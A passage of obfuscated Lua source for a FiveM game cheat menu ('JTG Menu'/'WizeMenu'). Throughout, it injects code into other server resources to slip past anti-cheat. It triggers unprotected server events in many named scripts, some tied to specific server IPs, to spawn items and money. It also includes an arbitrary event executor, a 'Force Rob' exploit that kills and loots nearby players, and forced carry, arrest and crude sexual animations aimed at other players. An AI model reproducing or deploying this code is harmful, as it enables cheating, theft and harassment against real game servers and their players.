        ]]);end);MachoMenuButton(v44[1168 -(645 + 522) ],"Blame Arrest",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function WXY7LpqKto()
                local closestPlayer, closestDistance = nil, math.huge
                local playerPed = PlayerPedId()
                local playerCoords = GetEntityCoords(playerPed)

                for _, playerId in ipairs(GetActivePlayers()) do
                    local targetPed = GetPlayerPed(playerId)
                    if targetPed ~= playerPed then
                        local targetCoords = GetEntityCoords(targetPed)
                        local distance = #(playerCoords - targetCoords)

                        if distance < closestDistance then
                            closestDistance = distance
                            closestPlayer = playerId
                        end
                    end
                end

                if closestPlayer then
                    if StarkCuff then
                        ClearPedSecondaryTask(playerPed)
                        DetachEntity(playerPed, true, false)
                        StarkCuff = false
                    else
                        StarkCuff = true
                        if not HasAnimDictLoaded("mp_arresting") then
                            RequestAnimDict("mp_arresting")
                            while not HasAnimDictLoaded("mp_arresting") do
                                Wait(0)
                            end
                        end

                        local targetPed = GetPlayerPed(closestPlayer)
                        AttachEntityToEntity(PlayerPedId(), targetPed, 4103, 0.35, 0.38, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                        TaskPlayAnim(PlayerPedId(), "mp_arresting", "idle", 8.0, -8, -1, 49, 0.0, false, false, false)
                    end
                end
            end

            WXY7LpqKto()
        ]]);end);MachoMenuButton(v44[1791 -(1010 + 780) ],"Blame Carry",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function KmXYpTzqLW()
                local closestPlayer, closestDistance = nil, math.huge
                local playerPed = PlayerPedId()
                local playerCoords = GetEntityCoords(playerPed)

                for _, playerId in ipairs(GetActivePlayers()) do
                    local targetPed = GetPlayerPed(playerId)
                    if targetPed ~= playerPed then
                        local targetCoords = GetEntityCoords(targetPed)
                        local distance = #(playerCoords - targetCoords)

                        if distance < closestDistance then
                            closestDistance = distance
                            closestPlayer = playerId
                        end
                    end
                end

                if closestPlayer then
                    if StarkCarry then
                        ClearPedSecondaryTask(playerPed)
                        DetachEntity(playerPed, true, false)
                        StarkCarry = false
                    else
                        StarkCarry = true
                        if not HasAnimDictLoaded("nm") then
                            RequestAnimDict("nm")
                            while not HasAnimDictLoaded("nm") do
                                Wait(0)
                            end
                        end

                        local targetPed = GetPlayerPed(closestPlayer)
                        AttachEntityToEntity(PlayerPedId(), targetPed, 0, 0.35, 0.08, 0.63, 0.5, 0.5, 180, false, false, false, false, 2, false)
                        TaskPlayAnim(PlayerPedId(), "nm", "firemans_carry", 8.0, -8.0, 100000, 33, 0, false, false, false)
                    end
                end
            end

            KmXYpTzqLW()
        ]]);end);MachoMenuButton(v44[1 + 0 ],"Sit On Them",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function PxKvqLtNYz()
                local closestPlayer, closestDistance = nil, math.huge
                local playerPed = PlayerPedId()
                local playerCoords = GetEntityCoords(playerPed)

                for _, playerId in ipairs(GetActivePlayers()) do
                    local targetPed = GetPlayerPed(playerId)
                    if targetPed ~= playerPed then
                        local targetCoords = GetEntityCoords(targetPed)
                        local distance = #(playerCoords - targetCoords)

                        if distance < closestDistance then
                            closestDistance = distance
                            closestPlayer = playerId
                        end
                    end
                end

                if not HasAnimDictLoaded("anim@heists@prison_heistunfinished_biztarget_idle") then
                    RequestAnimDict("anim@heists@prison_heistunfinished_biztarget_idle")
                    while not HasAnimDictLoaded("anim@heists@prison_heistunfinished_biztarget_idle") do
                        Wait(0)
                    end
                end

                AttachEntityToEntity(PlayerPedId(), GetPlayerPed(closestPlayer), 4103, 0.10, 0.28, 1.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                TaskPlayAnim(PlayerPedId(), "anim@heists@prison_heistunfinished_biztarget_idle", "target_idle", 8.0, -8.0, 9999999, 33, 9999999, false, false, false)
                TaskSetBlockingOfNonTemporaryEvents(PlayerPedId(), true)
            end

            PxKvqLtNYz()
        ]]);end);MachoMenuButton(v44[1],"Ride Driver",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function vZqPWLXm97()
                local closestPlayer, closestDistance = nil, math.huge
                local playerPed = PlayerPedId()
                local playerCoords = GetEntityCoords(playerPed)

                for _, playerId in ipairs(GetActivePlayers()) do
                    local targetPed = GetPlayerPed(playerId)
                    if targetPed ~= playerPed then
                        local targetCoords = GetEntityCoords(targetPed)
                        local distance = #(playerCoords - targetCoords)

                        if distance < closestDistance then
                            closestDistance = distance
                            closestPlayer = playerId
                        end
                    end
                end

                if closestPlayer then
                    if RideDriver then
                        ClearPedSecondaryTask(playerPed)
                        DetachEntity(playerPed, true, false)
                        RideDriver = false
                    else
                        RideDriver = true
                        if not HasAnimDictLoaded("mini@prostitutes@sexnorm_veh") then
                            RequestAnimDict("mini@prostitutes@sexnorm_veh")
                            while not HasAnimDictLoaded("mini@prostitutes@sexnorm_veh") do
                                Wait(0)
                            end
                        end

                        local targetPed = GetPlayerPed(closestPlayer)
                        AttachEntityToEntity(PlayerPedId(), targetPed, 0, 0.35, 0.08, 0.63, 0.5, 0.5, 180, false, false, false, false, 2, false)
                        TaskPlayAnim(PlayerPedId(), "mini@prostitutes@sexnorm_veh", "sex_loop_prostitute", 8.0, -8.0, 100000, 33, 0, false, false, false)
                    end
                end
            end

            vZqPWLXm97()
        ]]);end);MachoMenuButton(v44[1],"Blow Driver",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function qPLWtXYzKm()
                local closestPlayer, closestDistance = nil, math.huge
                local playerPed = PlayerPedId()
                local playerCoords = GetEntityCoords(playerPed)

                for _, playerId in ipairs(GetActivePlayers()) do
                    local targetPed = GetPlayerPed(playerId)
                    if targetPed ~= playerPed then
                        local targetCoords = GetEntityCoords(targetPed)
                        local distance = #(playerCoords - targetCoords)

                        if distance < closestDistance then
                            closestDistance = distance
                            closestPlayer = playerId
                        end
                    end
                end

                if closestPlayer then
                    if BlowDriver then
                        ClearPedSecondaryTask(playerPed)
                        DetachEntity(playerPed, true, false)
                        BlowDriver = false
                    else
                        BlowDriver = true
                        if not HasAnimDictLoaded("mini@prostitutes@sexnorm_veh") then
                            RequestAnimDict("mini@prostitutes@sexnorm_veh")
                            while not HasAnimDictLoaded("mini@prostitutes@sexnorm_veh") do
                                Wait(0)
                            end
                        end

                        TaskPlayAnim(PlayerPedId(), "mini@prostitutes@sexnorm_veh", "bj_loop_prostitute", 8.0, -8.0, 100000, 33, 0, false, false, false)
                    end
                end
            end

            qPLWtXYzKm()
        ]]);end);MachoMenuButton(v44[4 -3 ],"Meditate On Them",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function XYqLvTzWKo()
                local closestPlayer, closestDistance = nil, math.huge
                local playerPed = PlayerPedId()
                local playerCoords = GetEntityCoords(playerPed)

                for _, playerId in ipairs(GetActivePlayers()) do
                    local targetPed = GetPlayerPed(playerId)
                    if targetPed ~= playerPed then
                        local targetCoords = GetEntityCoords(targetPed)
                        local distance = #(playerCoords - targetCoords)

                        if distance < closestDistance then
                            closestDistance = distance
                            closestPlayer = playerId
                        end
                    end
                end

                if not HasAnimDictLoaded("rcmcollect_paperleadinout@") then
                    RequestAnimDict("rcmcollect_paperleadinout@")
                    while not HasAnimDictLoaded("rcmcollect_paperleadinout@") do
                        Wait(0)
                    end
                end

                AttachEntityToEntity(PlayerPedId(), GetPlayerPed(closestPlayer), 57005, 0, -0.12, 1.53, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                TaskPlayAnim(PlayerPedId(), "rcmcollect_paperleadinout", "meditiate_idle", 8.0, -8.0, 9999999, 33, 9999999, false, false, false)
                TaskSetBlockingOfNonTemporaryEvents(PlayerPedId(), true)
            end

            XYqLvTzWKo()
        ]]);end);local v58=0 -0 ;local v59=false;local v60=nil;local v61={[1836 -(1045 + 791) ]="slapped",[2 -1 ]="punched",[2 -0 ]="receiveblowjob",[508 -(351 + 154) ]="GiveBlowjob",[4]="headbutted",[1579 -(1281 + 293) ]="hug4",[6]="streetsexfemale",[7]="streetsexmale",[274 -(28 + 238) ]="pback2",[19 -10 ]="carry3",[10]=".....gta298",[11]=".....gta304",[1571 -(1381 + 178) ]=".....gta284"};MachoMenuDropDown(v44[2 + 0 ],"Emote Choice",function(v212) v58=v212;end,"Slapped","Punched","Give BJ","Recieve BJ","Headbutt","Hug","StreetSexFemale","StreetSexMale","Piggyback","Carry","Butt Rape","Amazing Head","Lesbian Scissors");MachoMenuButton(v44[2],"Give Emote",function() local v213=v61[v58];if v213 then MachoInjectResource2(3,(v48("monitor") and "monitor") or "any" ,string.format([[
                local function KmTpqXYzLv()
                    local Rk3uVnTZpxf7Q = TriggerEvent
                    Rk3uVnTZpxf7Q("ClientEmoteRequestReceive", "%s", true)
                end

                KmTpqXYzLv()
            ]],v213));end end);InputBoxHandle=MachoMenuInputbox(v45[1 + 0 ],"Name:","...");InputBoxHandle2=MachoMenuInputbox(v45[1],"Amount:","...");MachoMenuButton(v45[1 + 0 ],"Spawn",function() local v214=MachoMenuGetInputbox(InputBoxHandle);local v215=MachoMenuGetInputbox(InputBoxHandle2);if (v214 and (v214~="") and v215 and tonumber(v215)) then local v296=tonumber(v215);local v297={ak47_drugmanager=function() MachoInjectResource2(3,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function efjwr8sfr()
                            TriggerServerEvent('ak47_drugmanager:pickedupitem', "]]   .. v214   .. [[", "]]   .. v214   .. [[", ]]   .. v215   .. [[)
                        end

                        efjwr8sfr()
                    ]] );end,["bobi-selldrugs"]=function() MachoInjectResource2(3,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function safdagwawe()
                            TriggerServerEvent('bobi-selldrugs:server:RetrieveDrugs', "]]   .. v214   .. [[", ]]   .. v215   .. [[)
                        end

                        safdagwawe()
                    ]] );end,["mc9-taco"]=function() MachoInjectResource2(10 -7 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function cesfw33w245d()
                            TriggerServerEvent('mc9-taco:server:addItem', "]]   .. v214   .. [[", ]]   .. v215   .. [[)
                        end

                        cesfw33w245d()
                    ]] );end,["bobi-selldrugs"]=function() MachoInjectResource2(2 + 1 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function safdagwawe()
                            TriggerServerEvent('bobi-selldrugs:server:RetrieveDrugs', "]]   .. v214   .. [[", ]]   .. v215   .. [[)
                        end

                        safdagwawe()
                    ]] );end,["wp-pocketbikes"]=function() MachoInjectResource2(473 -(381 + 89) ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function awdfaweawewaeawe()
                            TriggerServerEvent("wp-pocketbikes:server:AddItem", "]]   .. v214   .. [[", ]]   .. v215   .. [[)
                        end

                        awdfaweawewaeawe()
                    ]] );end,["solos-jointroll"]=function() MachoInjectResource2(3,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function weawasfawfasfa()
                            TriggerServerEvent('solos-joints:server:itemadd', "]]   .. v214   .. [[", ]]   .. v215   .. [[)
                        end

                        weawasfawfasfa()
                    ]] );end,["angelicxs-CivilianJobs"]=function() MachoInjectResource2(3 + 0 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function safafawfaws()
                            TriggerServerEvent('angelicxs-CivilianJobs:Server:GainItem', "]]   .. v214   .. [[", ]]   .. v215   .. [[)
                        end

                        safafawfaws()
                    ]] );end,ars_whitewidow_v2=function() MachoInjectResource2(3 + 0 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function sDfjMawT34()
                            TriggerServerEvent('ars_whitewidow_v2:Buyitem', {
                                items = {
                                    {
                                        id = "]]   .. v214   .. [[",
                                        image = "JTG",
                                        name = "JTG",
                                        page = 1,
                                        price = 500,
                                        quantity = ]]   .. v215   .. [[,
                                        stock = 999999999999999999999999999,
                                        totalPrice = 0
                                    }
                                },
                                method = "cash",
                                total = 0
                            }, "cash")
                        end

                        sDfjMawT34()
                    ]] );end,ars_cannabisstore_v2=function() MachoInjectResource2(4 -1 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                    local function sDfjMawT34()
                        TriggerServerEvent("ars_cannabisstore_v2:Buyitem", {
                            items = {
                                {
                                    id = "]]   .. v214   .. [[",
                                    image = "JTG",
                                    name = "JTG",
                                    page = JTG,
                                    price = 0,
                                    quantity = ]]   .. v215   .. [[,
                                    stock = 10000000000000,
                                    totalPrice = 0
                                }
                            },
                            method = "JTG",
                            total = 0
                        }, "cash")
                    end

                    sDfjMawT34()
                    ]] );end,ars_hunting=function() MachoInjectResource2(1159 -(1074 + 82) ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function sDfjMawT34()
                            TriggerServerEvent("ars_hunting:sellBuyItem",  {
                                item = "]]   .. v214   .. [[",
                                price = 1,
                                quantity = ]]   .. v215   .. [[,
                                buy = true
                            })
                        end

                        sDfjMawT34()
                    ]] );end,["boii-whitewidow"]=function() local v310={"217.20.242.24:30120"};local function v311(v364) local v365=1784 -(214 + 1570) ;while true do if (v365==(1455 -(990 + 465))) then for v412,v413 in ipairs(v310) do if (v364==v413) then return true;end end return false;end end end local v312=GetCurrentServerEndpoint();if v311(v312) then MachoInjectResource2(2 + 1 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                            local function sDfjMawT34()
                                TriggerServerEvent('boii-whitewidow:server:AddItem', ']]   .. v214   .. [[', ]]   .. v215   .. [[)
                            end

                            sDfjMawT34()
                        ]] );end end,["codewave-cannabis-cafe"]=function() local v313={"185.244.106.45:30120"};local function v314(v366) for v374,v375 in ipairs(v313) do if (v366==v375) then return true;end end return false;end local v315=GetCurrentServerEndpoint();if v314(v315) then MachoInjectResource2(3 + 0 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                            local function sDfjMawT34()
                                TriggerServerEvent("cannabis_cafe:giveStockItems", { item = "]]   .. v214   .. [[", newItem = "JTG", pricePerItem = 0 }, ]]   .. v215   .. [[)
                            end

                            sDfjMawT34()
                        ]] );end end,["snipe-boombox"]=function() MachoInjectResource2(11 -8 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function sDfjMawT34()
                            TriggerServerEvent("snipe-boombox:server:pickup", ]]   .. v215   .. [[, vector3(0.0, 0.0, 0.0), "]]   .. v214   .. [[")
                        end

                        sDfjMawT34()
                    ]] );end,devkit_bbq=function() MachoInjectResource2(3,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function sDfjMawT34()
                            TriggerServerEvent('devkit_bbq:addinv', ']]   .. v214   .. [[', ]]   .. v215   .. [[)
                        end

                        sDfjMawT34()
                    ]] );end,mt_printers=function() MachoInjectResource2(1729 -(1668 + 58) ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[  
                        local function sDfjMawT34()
                            TriggerServerEvent('__ox_cb_mt_printers:server:itemActions', "mt_printers", "mt_printers:server:itemActions:JTG", "]]   .. v214   .. [[", "add")
                        end

                        sDfjMawT34()
                    ]] );end,WayTooCerti_3D_Printer=function() MachoInjectResource2(629 -(512 + 114) ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[ 
                        local function ZxUwQsErTy12()
                            TriggerServerEvent('waytoocerti_3dprinter:CompletePurchase', ']]   .. v214   .. [[', ]]   .. v215   .. [[)
                        end
                        ZxUwQsErTy12()
                    ]] );end,["pug-fishing"]=function() MachoInjectResource2(7 -4 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function MnBvCxZlKjHgFd23()
                            TriggerServerEvent('Pug:server:GiveFish', "]]   .. v214   .. [[", ]]   .. v215   .. [[)
                        end
                        MnBvCxZlKjHgFd23()
                    ]] );end,apex_koi=function() MachoInjectResource2(3,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function ErTyUiOpAsDfGh45()
                            TriggerServerEvent("apex_koi:client:addItem", "]]   .. v214   .. [[", ]]   .. v215   .. [[)
                        end
                        ErTyUiOpAsDfGh45()
                    ]] );end,apex_peckerwood=function() MachoInjectResource2(3,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function UiOpAsDfGhJkLz67()
                            TriggerServerEvent("apex_peckerwood:client:addItem", "]]   .. v214   .. [[", ]]   .. v215   .. [[)
                        end
                        UiOpAsDfGhJkLz67()
                    ]] );end,apex_thetown=function() MachoInjectResource2(5 -2 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function PlMnBvCxZaSdFg89()
                            TriggerServerEvent("apex_thetown:client:addItem", "]]   .. v214   .. [[", ]]   .. v215   .. [[)
                        end
                        PlMnBvCxZaSdFg89()
                    ]] );end,["codewave-bbq"]=function() MachoInjectResource2(3,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function QwErTyUiOpAsDf90()
                            for i = 1, ]]   .. v215   .. [[ do
                                TriggerServerEvent('placeProp:returnItem', "]]   .. v214   .. [[")
                                Wait(1)
                            end
                        end
                        QwErTyUiOpAsDf90()
                    ]] );end,brutal_hunting=function() MachoInjectResource2(3,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function TyUiOpAsDfGhJk01()
                            Wait(1)
                            TriggerServerEvent("brutal_hunting:server:AddItem", {
                                {
                                    amount = "]]   .. v215   .. [[",
                                    item = "]]   .. v214   .. [[",
                                    label = "J",
                                    price = 0
                                }
                            })
                        end
                        TyUiOpAsDfGhJk01()
                    ]] );end,xmmx_bahamas=function() MachoInjectResource2(3,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function JkLzXcVbNmQwEr02()
                            TriggerServerEvent("xmmx-bahamas:Making:GetItem", "]]   .. v214   .. [[", {
                                amount = ]]   .. v215   .. [[,
                                cash = {
                                }
                            })
                        end
                        JkLzXcVbNmQwEr02()
                    ]] );end,ak47_drugmanager=function() local v316=0 -0 ;local v317;local v318;local v319;while true do if (v316==(0 + 0)) then v317={"162.222.16.18:30120"};v318=nil;v316=1 + 0 ;end if (v316==1) then function v318(v400) local v401=0 -0 ;while true do if (v401==0) then for v425,v426 in ipairs(v317) do if (v400==v426) then return true;end end return false;end end end v319=GetCurrentServerEndpoint();v316=1996 -(109 + 1885) ;end if (2==v316) then if v318(v319) then MachoInjectResource2(3,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                            local function aKf48SlWd()
                                Wait(1)
                                TriggerServerEvent('ak47_drugmanager:pickedupitem', "]]   .. v214   .. [[", "]]   .. v214   .. [[", ]]   .. v215   .. [[)
                            end
                            aKf48SlWd()
                        ]] );end break;end end end,xmmx_letscookplus=function() MachoInjectResource2(1472 -(1269 + 200) ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function QwErTy123()
                            Wait(1)
                            TriggerServerEvent('xmmx_letscookplus:server:BuyItems', {
                                totalCost = 0,
                                cart = {
                                    {name = "]]   .. v214   .. [[", quantity = ]]   .. v215   .. [[}
                                }
                            }, "bank")
                        end
                        QwErTy123()
                    ]] );end,["xmmx-letscamp"]=function() local v320=0 -0 ;local v321;local v322;local v323;while true do if (v320==(815 -(98 + 717))) then v321={"66.70.153.70:80"};v322=nil;v320=1;end if ((1 -0)==v320) then function v322(v402) local v403=0 -0 ;while true do if (v403==0) then for v427,v428 in ipairs(v321) do if (v402==v428) then return true;end end return false;end end end v323=GetCurrentServerEndpoint();v320=2;end if (v320==2) then if  not v322(v323) then local v414=0 + 0 ;local v415;while true do if (v414==(0 + 0)) then v415=string.format([[ 
                            local function XcVbNm82()
                                Wait(1)
                                TriggerServerEvent('xmmx-letscamp:Cooking:GetItem', ']]   .. v214   .. [[', {
                                    ["%s"] = {
                                        ['lccampherbs'] = 0,
                                        ['lccampmeat'] = 0,
                                        ['lccampbutta'] = 0
                                    },
                                    ['amount'] = ]]   .. v215   .. [[
                                })
                            end
                            XcVbNm82()
                        ]] ,v214);MachoInjectResource2(1 + 2 ,"xmmx-letscamp",v415);break;end end end break;end end end,wasabi_mining=function() MachoInjectResource2(1 + 2 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                        local function MzXnJqKs88()
                            local item = {
                                difficulty = { "medium", "medium" },
                                item = "]]   .. v214   .. [[",
                                label = "JTG",
                                price = { 110, 140 }
                            }

                            local index = 3
                            local amount = ]]   .. v215   .. [[

                            for i = 1, amount do
                                Wait(1)
                                TriggerServerEvent('wasabi_mining:mineRock', item, index)
                            end
                        end
                        MzXnJqKs88()
                    ]] );end,apex_bahama=function() local v324={"89.31.216.161:30120"};local function v325(v367) for v376,v377 in ipairs(v324) do if (v367==v377) then return true;end end return false;end local v326=GetCurrentServerEndpoint();if v325(v326) then MachoInjectResource2(9 -6 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                            local function PlMnBv55()
                                Wait(1)
                                TriggerServerEvent("apex_bahama:client:addItem", "]]   .. v214   .. [[", ]]   .. v215   .. [[)
                            end
                            PlMnBv55()
                        ]] );end end,["jg-mechanic"]=function() local v327={"91.190.154.43:30120"};local function v328(v368) for v378,v379 in ipairs(v327) do if (v368==v379) then return true;end end return false;end local v329=GetCurrentServerEndpoint();if v328(v329) then MachoInjectResource2(3,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                            local function HjKlYu89()
                                Wait(1)
                                TriggerServerEvent('jg-mechanic:server:buy-item', "]]   .. v214   .. [[", 0, ]]   .. v215   .. [[, "autoexotic", 1)
                            end
                            HjKlYu89()
                        ]] );end end,["jg-mechanic"]=function() local v330={"191.96.152.17:30121"};local function v331(v369) local v370=0 + 0 ;while true do if (v370==(0 + 0)) then for v416,v417 in ipairs(v330) do if (v369==v417) then return true;end end return false;end end end local v332=GetCurrentServerEndpoint();if v331(v332) then MachoInjectResource2(2 + 1 ,(v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
                            local function LkJfQwOp78()
                                Wait(1)
                                TriggerServerEvent('jg-mechanic:server:buy-item', "]]   .. v214   .. [[", 0, ]]   .. v215   .. [[, "TheCultMechShop", 1)
                            end
                            LkJfQwOp78()
                        ]] );end end};local v298=false;for v333,v334 in pairs(v297) do if (GetResourceState(v333)=="started") then v334();v298=true;break;end end if  not v298 then MachoMenuNotification("[NOTIFICATION] JTG Menu","No Triggers Found.");end else MachoMenuNotification("[NOTIFICATION] JTG Menu","Invalid Item or Amount.");end end);MoneyInputBox=MachoMenuInputbox(v45[1435 -(797 + 636) ],"Amount:","...");MachoMenuButton(v45[9 -7 ],"Spawn Money",function() local v216=MachoMenuGetInputbox(MoneyInputBox);if (v216 and tonumber(v216)) then local v299=1619 -(1427 + 192) ;local v300;local v301;local v302;while true do if (v299==(0 + 0)) then v300=tonumber(v216);v301={["codewave-lashes-phone"]=function() MachoInjectResource2(6 -3 ,(v48("ReaperV4") and "ReaperV4") or (v48("monitor") and "monitor") or "any" ,[[
                    Wait(1)
                    TriggerServerEvent('delivery:giveRewardlashes', ]]   .. v300   .. [[)
                ]] );end,["codewave-nails-phone"]=function() MachoInjectResource2(3 + 0 ,(v48("ReaperV4") and "ReaperV4") or (v48("monitor") and "monitor") or "any" ,[[
                    Wait(1)
                    TriggerServerEvent('delivery:giveRewardnails', ]]   .. v300   .. [[)
                ]] );end,["codewave-caps-client-phone"]=function() MachoInjectResource2(3,(v48("ReaperV4") and "ReaperV4") or (v48("monitor") and "monitor") or "any" ,[[
                    Wait(1)
                    TriggerServerEvent('delivery:giveRewardCaps', ]]   .. v300   .. [[)
                ]] );end,["codewave-wigs-v3-phone"]=function() MachoInjectResource2(2 + 1 ,(v48("ReaperV4") and "ReaperV4") or (v48("monitor") and "monitor") or "any" ,[[
                    Wait(1)
                    TriggerServerEvent('delivery:giveRewardWigss', ]]   .. v300   .. [[)
                ]] );end,["codewave-icebox-phone"]=function() MachoInjectResource2(329 -(192 + 134) ,(v48("ReaperV4") and "ReaperV4") or (v48("monitor") and "monitor") or "any" ,[[
                    Wait(1)
                    TriggerServerEvent('delivery:giveRewardiceboxs', ]]   .. v300   .. [[)
                ]] );end,["codewave-sneaker-phone"]=function() MachoInjectResource2(1279 -(316 + 960) ,(v48("ReaperV4") and "ReaperV4") or (v48("monitor") and "monitor") or "any" ,[[
                    Wait(1)
                    TriggerServerEvent('delivery:giveRewardShoes', ]]   .. v300   .. [[)
                ]] );end,["codewave-handbag-phone"]=function() MachoInjectResource2(2 + 1 ,(v48("ReaperV4") and "ReaperV4") or (v48("monitor") and "monitor") or "any" ,[[
                    Wait(1)
                    TriggerServerEvent('delivery:giveRewardhandbags', ]]   .. v300   .. [[)
                ]] );end};v299=1 + 0 ;end if (v299==2) then if  not v302 then MachoMenuNotification("[NOTIFICATION] WizeMenu","No Triggers Found.");end break;end if (v299==(1 + 0)) then v302=false;for v387,v388 in pairs(v301) do if (GetResourceState(v387)=="started") then v388();v302=true;break;end end v299=7 -5 ;end end else MachoMenuNotification("[NOTIFICATION] WizeMenu","Invalid Item or Amount.");end end);local v62=MachoMenuInputbox(v45[555 -(83 + 468) ],"Event:","...");local v63=MachoMenuInputbox(v45[1810 -(1202 + 604) ],"Type:","...");local v64=MachoMenuInputbox(v45[18 -14 ],"Resource:","...");local v65={"monitor","any"};MachoMenuButton(v45[10 -6 ],"Execute",function() local v217=MachoMenuGetInputbox(v62);local v218=MachoMenuGetInputbox(v63);local v219=MachoMenuGetInputbox(v64);if ( not v217 or (v217=="")) then return;end local v220,v221=load("return function() return "   .. v217   .. " end" );if  not v220 then return;end local v222,v223=pcall(v220);if ( not v222 or (type(v223)~="function")) then return;end local v224={pcall(v223)};if  not v224[1] then return;end local v225=v224[2];local v226={};for v260=3 + 0 , #v224 do table.insert(v226,v224[v260]);end local function v227(v261) if (type(v261)=="string") then return string.format("%q",v261);elseif ((type(v261)=="number") or (type(v261)=="boolean")) then return tostring(v261);elseif (type(v261)=="table") then local v404=0 + 0 ;local v405;local v406;while true do if ((0 + 0)==v404) then v405,v406=pcall(function() return json.encode(v261);end);return (v405 and string.format("json.decode(%q)",v406)) or "nil" ;end end else return "nil";end end local v228={};for v262,v263 in ipairs(v226) do table.insert(v228,v227(v263));end local v229=(( #v228>(0 + 0)) and table.concat(v228,", ")) or "" ;local v230=string.format([[
            local event = %q
            local triggerType = string.lower(%q)
            local args = { %s }

            if triggerType == "server" then
                TriggerServerEvent(event, table.unpack(args))
            else
                TriggerEvent(event, table.unpack(args))
            end
        ]],tostring(v225),string.lower(v218 or "client" ),v229);local v231=nil;if (v219 and (v219~="")) then if (GetResourceState(v219)=="started") then v231=v219;end else for v335,v336 in ipairs(v65) do if (GetResourceState(v336)=="started") then v231=v336;break;end end end if v231 then MachoInjectResource(v231,v230);end end);local v66=0 + 0 ;local v67={[0]={name="[E] Force Rob",resource=nil,code=nil}};MachoMenuDropDown(v45[3],"Exploit Choice",function(v232) v66=v232;end,v67[0 -0 ].name);MachoMenuButton(v45[3],"Execute",function() local v233=0;local v234;while true do if (v233==(1912 -(340 + 1571))) then if (v66==0) then local v380=nil;local v381={"ox_inventory","ox_doorlock","ox_fuel","ox_target","ox_lib","ox_sit","ox_appearance"};local v382={ox="ox_inventory",qb="qb-inventory"};for v389,v390 in pairs(v382) do if (GetResourceState(v390)=="started") then v380=v389;break;end end for v391,v392 in ipairs(v381 or {} ) do if (GetResourceState(v392)=="started") then MachoInjectResource2(1951 -(1096 + 852) ,v392,([[
                        local function awt72q48dsgn()
                            local awgfh347gedhs = CreateThread
                            awgfh347gedhs(function()
                                local dict = 'missminuteman_1ig_2'
                                local anim = 'handsup_enter'

                                RequestAnimDict(dict)
                                while not HasAnimDictLoaded(dict) do
                                    Wait(0)
                                end

                                while true do
                                    Wait(0)
                                    if IsDisabledControlJustPressed(0, 38) then
                                        local selfPed = PlayerPedId()
                                        local selfCoords = GetEntityCoords(selfPed)
                                        local closestPlayer = -1
                                        local closestDistance = -1

                                        for _, player in ipairs(GetActivePlayers()) do
                                            local targetPed = GetPlayerPed(player)
                                            if targetPed ~= selfPed then
                                                local coords = GetEntityCoords(targetPed)
                                                local dist = #(selfCoords - coords)
                                                if closestDistance == -1 or dist < closestDistance then
                                                    closestDistance = dist
                                                    closestPlayer = player
                                                end
                                            end
                                        end

                                        if closestPlayer ~= -1 and closestDistance <= 3.0 then
                                            local ped = GetPlayerPed(closestPlayer)

                                            local CEPressPlayer = SetEnableHandcuffs
                                            local CEDeadPlayerCheck = SetEntityHealth

                                            if not IsPedCuffed(ped) then
                                                CEPressPlayer(ped, true)
                                                CEDeadPlayerCheck(ped, 0)
                                                CEPressPlayer(ped, true)
                                            end

                                            if not IsEntityPlayingAnim(ped, dict, anim, 13) then
                                                TaskPlayAnim(ped, dict, anim, 8.0, 8.0, -1, 50, 0, false, false, false)
                                            end
                                            
                                            local ActiveInventory = "%s"
                                            local serverId = GetPlayerServerId(closestPlayer)
                                            if ActiveInventory == "ox" then
                                                TriggerEvent('ox_inventory:openInventory', 'otherplayer', serverId)
